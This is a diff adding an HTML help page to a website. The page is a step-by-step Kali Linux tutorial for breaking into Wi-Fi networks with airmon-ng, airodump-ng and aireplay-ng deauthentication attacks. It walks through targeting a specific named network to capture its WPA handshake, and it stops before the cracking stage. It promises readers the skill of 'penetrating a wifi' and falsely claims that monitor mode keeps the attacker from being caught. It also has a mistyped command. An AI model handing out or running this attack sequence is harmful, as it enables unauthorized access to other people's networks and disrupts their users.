@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoPrimico Help</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="img/Logo.png">
+</head>
+
+<style>
+   body{
+    cursor: url("img/DebianCursor.png"), auto;
+   }
+   .explicacionkali{
+    width: 100%;
+    max-width: 400px;
+    box-shadow: white 0px 0px 10px;
+    border-radius: 10px;
+    margin: 0 auto;
+    display: block;
+    margin-top: 20px;
+   }
+   .explicacionkali:hover{
+    cursor: url("img/kaliCursor.png"), auto;
+    transform: scale(110%);
+   }
+   .explicacionkali:active{
+    transform: scale(70%);
+   }
+   /*1 version*/
+   .explicacionkali1{
+    width: 100%;
+    max-width: 400px;
+    box-shadow: white 0px 0px 10px;
+    border-radius: 10px;
+    margin: 0 auto;
+    display: block;
+    margin-top: 20px;
+   }
+   .explicacionkali1:hover{
+    cursor: url("img/kaliCursor.png"), auto;
+    transform: scale(200%);
+   }
+   .explicacionkali1:active{
+    transform: scale(70%);
+   }
+  
+</style>
+<body>
+    <script src="auth.js"></script>
+<script>
+    protectPage();
+</script>
+
+    <header class="Barra-Menu">
+        <h1>SoPrimico</h1>
+        <nav class="Botones">
+    <button onclick="location.href='index.html'">Home</button>
+    <button onclick="location.href='services.html'">Services</button>
+    <button onclick="location.href='games.html'">Games</button>
+    <button onclick="location.href='help.html'">Help</button>
+    <button onclick="location.href='profile.html'">Mi Perfil</button>
+    <button onclick="logout()">Cerrar Sesión</button>
+</nav>
+    </header>
+
+    <main class="main">
+        <h1 style="color: blue; z-index: 1; position: relative;margin-bottom: 20px; ">Reaver</h1>
+        <img src="img/reaver.png" alt="" class="REAVERIMGMIBOMBO1">
+        <p>Welcome to this free and fast tutorial of basic reaver commands! At the end you'll have learnend the skill of penetrating a wifi.</p>
+        <p class="p111"   style="color: red; font-weight: bolder;text-shadow: white 0px 0px 2px;">educational purposes</p>
+    </main>
+    <div class="main" style="margin-top: 30px;">
+        <h1>First steps before the penetring</h1>
+        <p>Lets start with opening the kali linux Virtual Machine (VM Recomended!)</p>
+        <img src="img/kalivm.png" alt="" class="explicacionkali">
+        <img src="img/openkali.png" alt="" class="explicacionkali">
+        <p>After opening kali we'll need to make sure that our wifi eth etc is conected (You will need an usb called tp link)</p>
+        <img src="img/wifireaver.png" alt="" class="explicacionkali">
+        <p>After Making sure we had the usb tp link connected to our virtual machine on kali we'll proceed with our first 2 commands</p>
+        <p>sudo airmon-ng check kill</p>
+        <p>sudo airmong-ng start wlan0</p>
+        <img src="img/img2firstcmds.png" alt="" class="explicacionkali1">
+        <p>This 2 commands will make you get into monitor mode so you will be safe from being catched</p>
+        <p>Now lets go for the first lan scann:</p>
+        <p>sudo airodump-ng wlan0</p>
+        <img src="img/airodumpwlan0.png" alt="" class="explicacionkali1">
+    </div>
+    <div class="main" style="margin-top: 30px;">
+        <h1>Penetring commands</h1>
+        <p>Now we'll chose the wifi we want, in our case we'll choose </p>
+        <p>We recomend you to note it on kali linux notes</p>
+        <img src="img/wlan0Aran.png" alt="" class="explicacionkali1">
+        <p>We're choosing A35 de Aran</p>
+        <p>Now we'll be searching on the aran's wifi with the next command</p>
+        <p>-c is channel: Look at your one, and -w is write so we'll be writing on capture_file, bssid is for the bssid lan</p>
+        <p>sudo airodump-ng -c 6 --bssid puthereyourbssid -w capture_file wlan0</p>
+        <img src="img/Aranwlan0.png" alt="" class="explicacionkali1">
+        <p>Now we will be opening a new cmd tab and we'll put the next script:</p>
+        <p>sudo aireplay-ng --deauth 1 -a PUTHERETHEBSSID -c PUTHERESTATION wlan0</p>
+        <img src="img/deauth--.png" alt="" class="explicacionkali1">
+        <p>We're finishing soon!</p>
+        <p>Now we'll go back to the other cmd opened and it might appear something called handshake, this wont appear everytime you try, this is just a basic method</p>
+        <h1>Soon: MIRAR DE FER HANDSHAKE I TOT LO DEMES</h1>
+    </div>
+
+</body>
+</html>
